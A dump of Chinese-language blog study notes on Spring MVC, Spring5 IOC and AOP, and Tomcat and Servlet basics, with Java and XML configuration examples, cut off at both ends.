如果同名的参数过多，可以将其设置为数组，这样数组内的每一个元素均为数据，如果不设置数组，则字符将传入的数据用,进行分隔\n通过POJO获取请求参数\n在控制器方法的形参位置设置一个实体类类型的形参，此时若浏览器传输的请求参数的参数名和实体类中的属性名一致，那么请求参数就会为此属性赋值\n类User中的属性名对应提交的数据 1 2 3 4 5 6 @RequestMapping(\u0026#34;/testpojo\u0026#34;) public String testPOJO(User user){ System.out.println(user); return \u0026#34;success\u0026#34;; } //最终结果--\u0026gt;User{id=null, username=\u0026#39;张三\u0026#39;, password=\u0026#39;123\u0026#39;, age=23, sex=\u0026#39;男\u0026#39;, email=\u0026#39;123@qq.com\u0026#39;} 解决乱码问题\n可以在web.xml里面注册编码过滤器CharacterEncodingFilter，具体操作详情查看上述的web.xml文件 SpringMVC中处理编码的过滤器一定要配置到其他过滤器之前，否则无效 4 域对象共享数据 4.1 request域 使用ServletAPI向request域对象共享数据\n1 2 3 4 5 @RequestMapping(\u0026#34;/testServletAPI\u0026#34;) public String testServletAPI(HttpServletRequest request){ request.setAttribute(\u0026#34;testScope\u0026#34;, \u0026#34;hello,servletAPI\u0026#34;); return \u0026#34;success\u0026#34;; } 使用ModelAndView向request域对象共享数据\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @RequestMapping(\u0026#34;/testModelAndView\u0026#34;) public ModelAndView testModelAndView(){ /** * ModelAndView有Model和View的功能 * Model主要用于向请求域共享数据 * View主要用于设置视图，实现页面跳转 */ ModelAndView mav = new ModelAndView(); //向请求域共享数据 mav.addObject(\u0026#34;testScope\u0026#34;, \u0026#34;hello,ModelAndView\u0026#34;); //设置视图，实现页面跳转 mav.setViewName(\u0026#34;success\u0026#34;); return mav; } 使用Model向request域对象共享数据\nmodel方式用的比较多 1 2 3 4 5 @RequestMapping(\u0026#34;/testModel\u0026#34;) public String testModel(Model model){ model.addAttribute(\u0026#34;testScope\u0026#34;, \u0026#34;hello,Model\u0026#34;); return \u0026#34;success\u0026#34;; } 使用map向request域对象共享数据\n1 2 3 4 5 @RequestMapping(\u0026#34;/testMap\u0026#34;) public String testMap(Map\u0026lt;String, Object\u0026gt; map){ map.put(\u0026#34;testScope\u0026#34;, \u0026#34;hello,Map\u0026#34;); return \u0026#34;success\u0026#34;; } 使用ModelMap向request域对象共享数据\n1 2 3 4 5 @RequestMapping(\u0026#34;/testModelMap\u0026#34;) public String testModelMap(ModelMap modelMap){ modelMap.addAttribute(\u0026#34;testScope\u0026#34;, \u0026#34;hello,ModelMap\u0026#34;); return \u0026#34;success\u0026#34;; } Model、ModelMap、Map的关系\n1 2 3 4 public interface Model{} public class ModelMap extends LinkedHashMap\u0026lt;String, Object\u0026gt; {} public class ExtendedModelMap extends ModelMap implements Model {} public class BindingAwareModelMap extends ExtendedModelMap {} 4.2 session域 直接使用HttpSession\n1 2 3 4 5 @RequestMapping(\u0026#34;/testSession\u0026#34;) public String testSession(HttpSession session){ session.setAttribute(\u0026#34;testSessionScope\u0026#34;, \u0026#34;hello,session\u0026#34;); return \u0026#34;success\u0026#34;; } 4.3 application域 通过ServletContext application = session.getServletContext();来添加对应的数据\n1 2 3 4 5 6 @RequestMapping(\u0026#34;/testApplication\u0026#34;) public String testApplication(HttpSession session){ ServletContext application = session.getServletContext(); application.setAttribute(\u0026#34;testApplicationScope\u0026#34;, \u0026#34;hello,application\u0026#34;); return \u0026#34;success\u0026#34;; } 5 视图 SpringMVC中的视图是View接口，视图的作用渲染数据，将模型Model中的数据展示给用户\nSpringMVC视图的种类很多，默认有转发视图和重定向视图\n视图步骤\n当控制器方法中所设置的视图名称没有任何前缀时，此时的视图名称会被SpringMVC配置文件中所配置的视图解析器解析，视图名称拼接视图前缀和视图后缀所得到的最终路径，会通过转发的方式实现跳转\n这里以thymeleaf为例\n1 2 3 4 @RequestMapping(\u0026#34;/testHello\u0026#34;) public String testHello(){ return \u0026#34;hello\u0026#34;; } 当控制器方法中所设置的视图名称以\u0026quot;forward:\u0026quot;为前缀时，创建InternalResourceView视图，此时的视图名称不会被SpringMVC配置文件中所配置的视图解析器解析，而是会将前缀\u0026quot;forward:\u0026quot;去掉，剩余部分作为最终路径通过转发的方式实现跳转\n1 2 3 4 @RequestMapping(\u0026#34;/testForward\u0026#34;) public String testForward(){ return \u0026#34;forward:/testHello\u0026#34;; } 当控制器方法中所设置的视图名称以\u0026quot;redirect:\u0026quot;为前缀时，创建RedirectView视图，此时的视图名称不会被SpringMVC配置文件中所配置的视图解析器解析，而是会将前缀\u0026quot;redirect:\u0026quot;去掉，剩余部分作为最终路径通过重定向的方式实现跳转\n1 2 3 4 @RequestMapping(\u0026#34;/testRedirect\u0026#34;) public String testRedirect(){ return \u0026#34;redirect:/testHello\u0026#34;; } 6 Restful 它们分别对应四种基本操作：GET 用来获取资源，POST 用来新建资源，PUT 用来更新资源，DELETE 用来删除资源。\nREST 风格提倡 URL 地址使用统一的风格设计，从前到后各个单词使用斜杠分开，不使用问号键值对方式携带请求参数，而是将要发送给服务器的数据作为 URL 地址的一部分，以保证整体风格的一致性。\n操作 传统方式 REST风格 查询操作 getUserById?id=1 user/1\u0026ndash;\u0026gt;get请求方式 保存操作 saveUser user\u0026ndash;\u0026gt;post请求方式 删除操作 deleteUser?id=1 user/1\u0026ndash;\u0026gt;delete请求方式 更新操作 updateUser user\u0026ndash;\u0026gt;put请求方式 SpringMVC给予解决方案\nSpringMVC 提供了 HiddenHttpMethodFilter 帮助我们将 POST 请求转换为 DELETE 或 PUT 请求\n当前请求的请求方式必须为post 当前请求必须传输请求参数_method 在web.xml里面找注册\n1 2 3 4 5 6 7 8 \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;HiddenHttpMethodFilter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.springframework.web.filter.HiddenHttpMethodFilter\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;HiddenHttpMethodFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; 对应提交过来的请求中应该包含参数\n参数名：_method value:PUT or DELETE 传输的请求方式必须为POST 7 文件上传下载 文件下载\n使用ResponseEntity实现下载文件的功能\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // 实际使用的时候，将需要下载的路径作为参数传递即可 @RequestMapping(\u0026#34;/testDown\u0026#34;) public ResponseEntity\u0026lt;byte[]\u0026gt; testResponseEntity(HttpSession session) throws IOException { //获取ServletContext对象 ServletContext servletContext = session.getServletContext(); //获取服务器中文件的真实路径 String realPath = servletContext.getRealPath(\u0026#34;/static/img/1.jpg\u0026#34;); //创建输入流 InputStream is = new FileInputStream(realPath); //创建字节数组 byte[] bytes = new byte[is.available()]; //将流读到字节数组中 is.read(bytes); //创建HttpHeaders对象设置响应头信息 MultiValueMap\u0026lt;String, String\u0026gt; headers = new HttpHeaders(); //设置要下载方式以及下载文件的名字 headers.add(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment;filename=1.jpg\u0026#34;); //设置响应状态码 HttpStatus statusCode = HttpStatus.OK; //创建ResponseEntity对象 ResponseEntity\u0026lt;byte[]\u0026gt; responseEntity = new ResponseEntity\u0026lt;\u0026gt;(bytes, headers, statusCode); //关闭输入流 is.close(); return responseEntity; } 文件上传\n文件上传要求form表单的请求方式必须为post，并且添加属性enctype=\u0026quot;multipart/form-data\u0026quot;\nSpringMVC中将上传的文件封装到MultipartFile对象中，通过此对象可以获取文件相关信息\n步骤\n添加依赖\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-fileupload\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-fileupload\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.3.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 在SpringMVC.xml里面注册组件\n1 2 \u0026lt;!--必须通过文件解析器的解析才能将文件转换为MultipartFile对象--\u0026gt; \u0026lt;bean id=\u0026#34;multipartResolver\u0026#34; class=\u0026#34;org.springframework.web.multipart.commons.CommonsMultipartResolver\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 实际方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @RequestMapping(\u0026#34;/testUp\u0026#34;) public String testUp(MultipartFile photo, HttpSession session) throws IOException { //获取上传的文件的文件名 String fileName = photo.getOriginalFilename(); //处理文件重名问题 String hzName = fileName.substring(fileName.lastIndexOf(\u0026#34;.\u0026#34;)); fileName = UUID.randomUUID().toString() + hzName; //获取服务器中photo目录的路径 ServletContext servletContext = session.getServletContext(); String photoPath = servletContext.getRealPath(\u0026#34;photo\u0026#34;); File file = new File(photoPath); if(!file.exists()){ file.mkdir(); } String finalPath = photoPath + File.separator + fileName; //实现上传功能 photo.transferTo(new File(finalPath)); return \u0026#34;success\u0026#34;; } 8 拦截器 SpringMVC中的拦截器有三个抽象方法： preHandle：控制器方法执行之前执行preHandle()，其boolean类型的返回值表示是否拦截或放行，返回true为放行，即调用控制器方法；返回false表示拦截，即不调用控制器方法 postHandle：控制器方法执行之后执行postHandle() afterComplation：处理完视图和模型数据，渲染视图完毕之后执行afterComplation() 多个拦截器一起工作的时候 preHandle之前的顺序按照SpringMVC.xml里面组件注册的先后顺序执行，并相当于以栈的形式压入。 后面的按照出栈的形式执行。 如果一个拦截器的preHandle返回false，则其之后的拦截器的都不会执行，postHandle()都不执行，返回false的拦截器之前的拦截器的afterComplation()会执行 9 异常处理 SpringMVC提供了自定义的异常处理器SimpleMappingExceptionResolver，使用方式：\n基于注解\n1 2 3 4 5 6 7 8 9 10 11 12 13 //@ControllerAdvice将当前类标识为异常处理的组件 @ControllerAdvice public class ExceptionController { //@ExceptionHandler用于设置所标识方法处理的异常 @ExceptionHandler(ArithmeticException.class) //ex表示当前请求处理中出现的异常对象 public String handleArithmeticException(Exception ex, Model model){ model.addAttribute(\u0026#34;ex\u0026#34;, ex); return \u0026#34;error\u0026#34;; } } 10 SpringMVC执行流程 用户向服务器发送请求，请求被SpringMVC 前端控制器 DispatcherServlet捕获。\nDispatcherServlet对请求URL进行解析，得到请求资源标识符（URI），判断请求URI对应的映射：\na) 不存在\ni. 再判断是否配置了mvc:default-servlet-handler ii. 如果没配置，则控制台报映射查找不到，客户端展示404错误 iii. 如果有配置，则访问目标资源（一般为静态资源，如：JS,CSS,HTML)，找不到客户端也会展示404错误 b) 存在则执行下面的流程\n根据该URI，调用HandlerMapping获得该Handler配置的所有相关的对象（包括Handler对象以及Handler对象对应的拦截器），最后以HandlerExecutionChain执行链对象的形式返回。\nDispatcherServlet 根据获得的Handler，选择一个合适的HandlerAdapter。\n如果成功获得HandlerAdapter，此时将开始执行拦截器的preHandler(…)方法【正向】\n提取Request中的模型数据，填充Handler入参，开始执行Handler（Controller)方法，处理请求。在填充Handler的入参过程中，根据你的配置，Spring将帮你做一些额外的工作：\na) HttpMessageConveter： 将请求消息（如Json、xml等数据）转换成一个对象，将对象转换为指定的响应信息 b) 数据转换：对请求消息进行数据转换。如String转换成Integer、Double等 c) 数据格式化：对请求消息进行数据格式化。 如将字符串转换成格式化数字或格式化日期等 d) 数据验证： 验证数据的有效性（长度、格式等），验证结果存储到BindingResult或Error中 Handler执行完成后，向DispatcherServlet 返回一个ModelAndView对象。\n此时将开始执行拦截器的postHandle(\u0026hellip;)方法【逆向】。\n根据返回的ModelAndView（此时会判断是否存在异常：如果存在异常，则执行HandlerExceptionResolver进行异常处理）选择一个适合的ViewResolver进行视图解析，根据Model和View，来渲染视图。\n渲染视图完毕执行拦截器的afterCompletion(…)方法【逆向】。\n将渲染结果返回给客户端。\n","permalink":"http://www.reus09.top/posts/tech/spring-mvc/","summary":"Spring-mvc 本篇主要对spring-mvc的知识点进行总结 MVC的工作流程： 用户通过视图层发送请求到服务器，在服务器中请求被Controller接收，","title":"Spring Mvc"},{"content":"Spring5 框架 这里主要学习了Spring5的相关知识，对ioc和Aop的相关知识进行整理 0x01 IOC 概念 控制反转，把创建对象过程交给 Spring 进行管理 使用目的： 为了耦合度降低 底层原理 xml 解析、工厂模式、反射 IOC 思想基于 IOC 容器完成，IOC 容器底层就是对象工厂 1.1 实现方式 BeanFactory：IOC 容器基本实现，是 Spring 内部的使用接口，不提供开发人员进行使用 加载配置文件时候不会创建对象，在获取对象（使用）才去创建对象 ApplicationContext：BeanFactory 接口的子接口，提供更多更强大的功能，一般由开发人 员进行使用 加载配置文件时候就会把在配置文件对象进行创建 Bean管理 Spring创建对象 Spring注入属性 实现方法 基于xml配置文件方式实现 基于注解方式实现 1.2 xml配置文件 1.2.1 创建对象 在 spring 配置文件中，使用 bean 标签，标签里面添加对应属性，就可以实现对象创建 在 bean 标签有很多属性，介绍常用的属性 * id 属性:唯一标识 class 属性:类全路径（包类路径) 创建对象时候，默认也是执行无参数构造方法完成对象创建 1 \u0026lt;bean id=\u0026#34;user\u0026#34; class=\u0026#34;com.atguigu.spring5.User\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 1.2.2 注入属性 DI：依赖注入，就是注入属性 1.2.2.1 set方法注入 这个注入方法类中必须要有set方法，使用property属性\n1 2 3 4 \u0026lt;bean id=\u0026#34;book\u0026#34; class=\u0026#34;com.atguigu.spring5.Book\u0026#34;\u0026gt; \u0026lt;!--使用 property 完成属性注入 name：类里面属性名称 value：向属性注入的值 --\u0026gt; \u0026lt;property name=\u0026#34;bname\u0026#34; value=\u0026#34;易筋经\u0026#34;\u0026gt;\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; 这个在book中对于类中的元素必须实现了setBname方法\n1 2 public void setBname(String bname) { this.bname = bname; } 1.2.2.2 有参数构造注入 这个注入方式，构造类中必须有对应的构造方法。构造方法含有几个参数便在bean中添加几个元素，使用constructor-arg属性进行配置\n1 2 3 4 \u0026lt;bean id=\u0026#34;orders\u0026#34; class=\u0026#34;com.atguigu.spring5.Orders\u0026#34;\u0026gt; \u0026lt;constructor-arg name=\u0026#34;oname\u0026#34; value=\u0026#34;电脑\u0026#34;\u0026gt;\u0026lt;/constructor-arg\u0026gt; \u0026lt;constructor-arg name=\u0026#34;address\u0026#34; value=\u0026#34;China\u0026#34;\u0026gt;\u0026lt;/constructor-arg\u0026gt; \u0026lt;/bean\u0026gt; 对应的构造方法为\n1 2 3 4 5 public Orders(String oname,String address) { this.oname = oname; this.address = address; } 1.2.2.3 p名称空间注入 需要在bean中导入http://www.springframework.org/schema/p中的工具进行约束\n这里以使用set方法的注入为例\n1 \u0026lt;bean id=\u0026#34;book\u0026#34; class=\u0026#34;com.atguigu.spring5.Book\u0026#34; p:bname=\u0026#34;九阳神功\u0026#34; p:bauthor=\u0026#34;无名氏\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 1.2.2.4 其他类型属性注入 字面量\nnull值，用\u0026lt;null/\u0026gt;来修饰即可\n属性包含特殊值，比如\u0026lt;或\u0026gt;\n法一：借助\u0026amp;lt，\u0026amp;gt等转义符\n法二：使用CDATA\n1 2 3 \u0026lt;property name=\u0026#34;address\u0026#34;\u0026gt; \u0026lt;value\u0026gt;\u0026lt;![CDATA[\u0026lt;\u0026lt;南京\u0026gt;\u0026gt;]]\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; 注入外部属性\n在一个类中，另一个类注入到这个类中，可以先创建两个对应的对象后，使用ref属性，将类注入到需要注入的类中\n外部bean\n1 2 3 4 5 6 7 \u0026lt;!--1 service 和 dao 对象创建--\u0026gt; \u0026lt;bean id=\u0026#34;userService\u0026#34; class=\u0026#34;com.atguigu.spring5.service.UserService\u0026#34;\u0026gt; \u0026lt;!--注入 userDao 对象 name 属性：类里面属性名称 ref 属性：创建 userDao 对象 bean 标签 id 值 --\u0026gt; \u0026lt;property name=\u0026#34;userDao\u0026#34; ref=\u0026#34;userDaoImpl\u0026#34;\u0026gt;\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;bean id=\u0026#34;userDaoImpl\u0026#34; class=\u0026#34;com.atguigu.spring5.dao.UserDaoImpl\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 内部bean的操作就不在赘述，与上述类似\n级联赋值\n即被注入的类中也需要元素进行注入 可以直接ref 也可以在ref后，利用class.ss制定对应的类中元素进行赋值(这里的ss借指对应的类中元素) 注入集合类型\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;!--1 集合类型属性注入--\u0026gt; \u0026lt;bean id=\u0026#34;stu\u0026#34; class=\u0026#34;com.atguigu.spring5.collectiontype.Stu\u0026#34;\u0026gt; \u0026lt;!--数组类型属性注入--\u0026gt; \u0026lt;property name=\u0026#34;courses\u0026#34;\u0026gt; \u0026lt;array\u0026gt; \u0026lt;value\u0026gt;java 课程\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;数据库课程\u0026lt;/value\u0026gt; \u0026lt;/array\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--list 类型属性注入--\u0026gt; \u0026lt;property name=\u0026#34;list\u0026#34;\u0026gt; \u0026lt;list\u0026gt; \u0026lt;value\u0026gt;张三\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;小三\u0026lt;/value\u0026gt; \u0026lt;/list\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--map 类型属性注入--\u0026gt; \u0026lt;property name=\u0026#34;maps\u0026#34;\u0026gt; \u0026lt;map\u0026gt; \u0026lt;entry key=\u0026#34;JAVA\u0026#34; value=\u0026#34;java\u0026#34;\u0026gt;\u0026lt;/entry\u0026gt; \u0026lt;entry key=\u0026#34;PHP\u0026#34; value=\u0026#34;php\u0026#34;\u0026gt;\u0026lt;/entry\u0026gt; \u0026lt;/map\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--set 类型属性注入--\u0026gt; \u0026lt;property name=\u0026#34;sets\u0026#34;\u0026gt; \u0026lt;set\u0026gt; \u0026lt;value\u0026gt;MySQL\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;Redis\u0026lt;/value\u0026gt; \u0026lt;/set\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; array引入array标签,list引入list，map引入map和entry，set引入set标签 1.2.3 FactoryBean Spring 有两种类型 bean，\n一种普通 bean 在配置文件中定义 bean 类型就是返回类型 另外一种工厂 bean（FactoryBean) 在配置文件定义 bean 类型可以和返回类型不一样 实现方法\n创建类，让这个类作为工厂 bean，实现接口 FactoryBean 实现接口里面的方法，在实现的方法中定义返回的 bean 类型 借用FactoryBean接口来实现\n1 2 3 4 5 6 7 8 9 10 11 12 13 public interface FactoryBean\u0026lt;T\u0026gt; { String OBJECT_TYPE_ATTRIBUTE = \u0026#34;factoryBeanObjectType\u0026#34;; @Nullable T getObject() throws Exception; @Nullable Class\u0026lt;?\u0026gt; getObjectType(); default boolean isSingleton() { return true; } } 1.2.4 Bean作用域 在 Spring 里面，默认情况下，bean 是单实例对象 在 spring 配置文件 bean 标签里面有属性（scope）用于设置单实例还是多实例 scope 属性值 第一个值 默认值，singleton，表示是单实例对象 第二个值 prototype，表示是多实例对象 1.2.5 生命周期 （1）通过构造器创建 bean 实例（无参数构造）\n（2）为 bean 的属性设置值和对其他 bean 引用（调用 set 方法）\n（3）调用 bean 的初始化的方法（需要进行配置初始化的方法）\n（4）bean 可以使用了（对象获取到了）\n（5）当容器关闭时候，调用 bean 的销毁的方法（需要进行配置销毁的方法）\n这里以代码为例\n1 2 3 \u0026lt;bean id=\u0026#34;orders\u0026#34; class=\u0026#34;com.atguigu.spring5.bean.Orders\u0026#34; init-method=\u0026#34;initMethod\u0026#34; destroy-method=\u0026#34;destroyMethod\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;oname\u0026#34; value=\u0026#34;手机\u0026#34;\u0026gt;\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; 利用init-method，destory-method两个属性执行初始化方法和销毁方法 加上后置处理器，bean生命周期共有七步\n（1）通过构造器创建 bean 实例（无参数构造） （2）为 bean 的属性设置值和对其他 bean 引用（调用 set 方法） （3）把 bean 实例传递 bean 后置处理器的方法 postProcessBeforeInitialization （4）调用 bean 的初始化的方法（需要进行配置初始化的方法） （5）把 bean 实例传递 bean 后置处理器的方法 postProcessAfterInitialization （6）bean 可以使用了（对象获取到了） （7）当容器关闭时候，调用 bean 的销毁的方法（需要进行配置销毁的方法） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class MyBeanPost implements BeanPostProcessor { @Override public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException { System.out.println(\u0026#34;在初始化之前执行的方法\u0026#34;); return bean; } @Override public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException { System.out.println(\u0026#34;在初始化之后执行的方法\u0026#34;); return bean; } } xml配置,全局开启后置处理器\n1 \u0026lt;bean id=\u0026#34;myBeanPost\u0026#34; class=\u0026#34;com.atguigu.spring5.bean.MyBeanPost\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 1.2.6 自动装配 bean 标签属性 autowire，配置自动装配 autowire 属性常用两个值： byName 根据属性名称注入 ,注入值 bean 的 id 值和类属性名称一样 byType 根据属性类型注入 1.3 基于注解方式 （1）注解是代码特殊标记，格式：@注解名称(属性名称=属性值, 属性名称=属性值..)\n（2）使用注解，注解作用在类上面，方法上面，属性上面\n（3）使用注解目的：简化 xml 配置\nSpring 针对 Bean 管理中创建对象提供注解\n@Component:常用于正常的组件 @Service :常用于service层 @Controller ：常用于controller层 @Repository : 常用于dao层 上面四个注解功能是一样的，都可以用来创建 bean 实例，只是作用的层次不一样 使用注解需要开启注解扫描\nxml\n1 \u0026lt;context:component-scan base-package=\u0026#34;com.atguigu\u0026#34;\u0026gt;\u0026lt;/context:component-scan\u0026gt; 纯代码,需要创建配置类\n1 2 3 @Configuration //作为配置类，替代 xml 配置文件 @ComponentScan(basePackages = {\u0026#34;com.atguigu\u0026#34;}) public class SpringConfig { } 基于注解方式实现属性注入\n@Autowired：根据属性类型进行自动装配\n首先按照类型去容器中找对应的组件，如果找到一个就赋值，找不到就抛异常； 如果有多个类型匹配时，会使用要注入的对象变量名称作为bean的id，在spring容器查找，找到了也可以注入成功，找不到就报错。 结合注解@Qualifer，指定一个id：在自动按照类型注入的基础之上，再按照指定的bean的id去查找。它在给字段注入时不能独立使用，必须和@Autowired一起使用；但是给方法参数注入时，可以独立使用。 1 2 3 4 5 6 7 8 9 10 11 @Service public class UserService { //定义 dao 类型属性 //不需要添加 set 方法 //添加注入属性注解 @Autowired private UserDao userDao; public void add() { System.out.println(\u0026#34;service add.......\u0026#34;); userDao.add(); } } @Qualifier：根据名称进行注入 这个@Qualifier 注解的使用，和上面@Autowired 一起使用\n1 2 3 4 5 //定义 dao 类型属性 //不需要添加 set 方法 //添加注入属性注解 @Autowired //根据类型进行注入 @Qualifier(value = \u0026#34;userDaoImpl1\u0026#34;) //根据名称进行注入 private UserDao userDao; @Resource：可以根据类型注入，可以根据名称注入\n1 2 3 4 //@Resource //根据类型进行注入 @Resource(name = \u0026#34;userDaoImpl1\u0026#34;) private UserDao userDao; @Value：注入普通类型属性\n1 2 @Value(value = \u0026#34;abc\u0026#34;) private String name; 1.4 实现IOC容器中对象的获取 xml\n1 2 3 ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\u0026#34;spring-config.xml\u0026#34;); Object obj = context.getBean(\u0026#34;obj\u0026#34;, Object.class); 全注解\nconfig写的是实现IOC扫描的配置类 1 2 3 ApplicationContext context = new AnnotationConfigApplicationContext(Config.class); Object obj = context.getBean(\u0026#34;obj\u0026#34;, Object.class); 0x02 Aop 概念 面向切面，不修改源代码进行功能增强 面向切面编程（方面），利用 AOP 可以对业务逻辑的各个部分进行隔离，从而使得 业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。 底层原理 AOP 底层使用动态代理 2.1 动态代理 使用方法newProxyInstance\n1 2 3 4 5 6 7 8 9 10 11 12 13 public static Object newProxyInstance(ClassLoader loader, Class\u0026lt;?\u0026gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException Returns an instance of a proxy class for the specified interfaces that dispatches method invocations to the specified invocation handler. Proxy.newProxyInstance throws IllegalArgumentException for the same reasons that Proxy.getProxyClass does. Parameters: loader - the class loader to define the proxy class interfaces - the list of interfaces for the proxy class to implement h - the invocation handler to dispatch method invocations to Returns: a proxy instance with the specified invocation handler of a proxy class that is defined by the specified class loader and that implements the specified interfaces 方法有三个参数：\n第一参数，类加载器 第二参数，增强方法所在的类，这个类实现的接口，支持多个接口 第三参数，实现这个接口 InvocationHandler，创建代理对象，写增强的部分 处理的增强结果是借用InvocationHandler接口的invoke方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class UserDaoProxy implements InvocationHandler{ private Object obj; public UserDaoProxy(Object obj) { this.obj = obj; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(\u0026#34;发放之前执行....\u0026#34;+method.getName()+\u0026#34;参数：\u0026#34;+ Arrays.toString(args)); Object res = method.invoke(obj,args); System.out.println(\u0026#34;方法之后执行\u0026#34;); return res; } } 2.2 Aop术语 连接点\n类里面哪些方法可以被增强，属于连接点 切入点\n实际被增强的方法，成为切入点\n表达式\n1 2 3 4 5 6 7 8 9 10 11 execution([权限修饰符] [返回类型] [类全路径] [方法名称]([参数列表]) ) 举例 1：对 com.atguigu.dao.BookDao 类里面的 add 进行增强 execution(* com.atguigu.dao.BookDao.add(..)) 举例 2：对 com.atguigu.dao.BookDao 类里面的所有的方法进行增强 execution(* com.atguigu.dao.BookDao.* (..)) 举例 3：对 com.atguigu.dao 包里面所有类，类里面所有方法进行增强 execution(* com.atguigu.dao.*.* (..)) 相同的切入点可以使用@Pointcut进行注册同一个路径\n1 2 3 4 5 6 7 8 @Pointcut(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void pointdemo() { } //前置通知 //@Before 注解表示作为前置通知 @Before(value = \u0026#34;pointdemo()\u0026#34;) public void before() { System.out.println(\u0026#34;before.........\u0026#34;); } 通知（增强）\n实际增强的逻辑部分 通知的类型 前置通知:Before 后置通知:AfterReturning 环绕通知:Around 异常通知:AfterThrowing 最终通知:After 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 @Component @Aspect //生成代理对象 public class UserProxy { //前置通知 //@Before 注解表示作为前置通知 @Before(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void before() { System.out.println(\u0026#34;before.........\u0026#34;); } //后置通知（返回通知） @AfterReturning(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void afterReturning() { System.out.println(\u0026#34;afterReturning.........\u0026#34;); } //最终通知 @After(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void after() { System.out.println(\u0026#34;after.........\u0026#34;); } //异常通知 @AfterThrowing(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void afterThrowing() { System.out.println(\u0026#34;afterThrowing.........\u0026#34;); } //环绕通知 @Around(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void around(ProceedingJoinPoint proceedingJoinPoint) throws Throwable { System.out.println(\u0026#34;环绕之前.........\u0026#34;); //被增强的方法执行 proceedingJoinPoint.proceed(); System.out.println(\u0026#34;环绕之后.........\u0026#34;); } } 切面\n动作，过程 实现增强的过程代码 实现过程\n对使用的类要进行组件注册，使用ioc注册，增强类用Aspect\n需要开启全局代理\nxml\n1 2 3 \u0026lt;!-- 开启 Aspect 生成代理对象--\u0026gt; \u0026lt;aop:aspectj-autoproxy\u0026gt;\u0026lt;/aop:aspectj-autoproxy\u0026gt; 完全注解\n1 2 3 4 @Configuration @ComponentScan(basePackages = {\u0026#34;com.atguigu\u0026#34;}) @EnableAspectJAutoProxy(proxyTargetClass = true) public class ConfigAop { } @Order可以设置优先级，数字越小优先级越高。\n","permalink":"http://www.reus09.top/posts/tech/spring/","summary":"Spring5 框架 这里主要学习了Spring5的相关知识，对ioc和Aop的相关知识进行整理 0x01 IOC 概念 控制反转，把创建对象过程交给 Spring 进行管理 使用目的： 为了","title":"Spring"},{"content":"0x01 Tomcat使用 1.1 Tomcat设置编码 Tomcat设置编码\ntomcat8之前，设置编码：\nget请求方式： get方式目前不需要设置编码（基于tomcat8）\n如果是get请求发送的中文数据，转码稍微有点麻烦（tomcat8之前）\n1 2 3 4 5 String fname = request.getParameter(\u0026#34;fname\u0026#34;); //1.将字符串打散成字节数组 byte[] bytes = fname.getBytes(\u0026#34;ISO-8859-1\u0026#34;); //2.将字节数组按照设定的编码重新组装成字符串 fname = new String(bytes,\u0026#34;UTF-8\u0026#34;); post请求方式： request.setCharacterEncoding(\u0026quot;UTF-8\u0026quot;);\ntomcat8开始，设置编码，只需要针对post方式 request.setCharacterEncoding(\u0026quot;UTF-8\u0026quot;);\n注意：\n需要注意的是，设置编码(post)这一句代码必须在所有的获取参数动作之前 1.2 Servlet 1.2.1 继承关系 Servlet的继承关系 - 重点查看的是服务方法（service()）\n继承关系 javax.servlet.Servlet接口 javax.servlet.GenericServlet抽象类 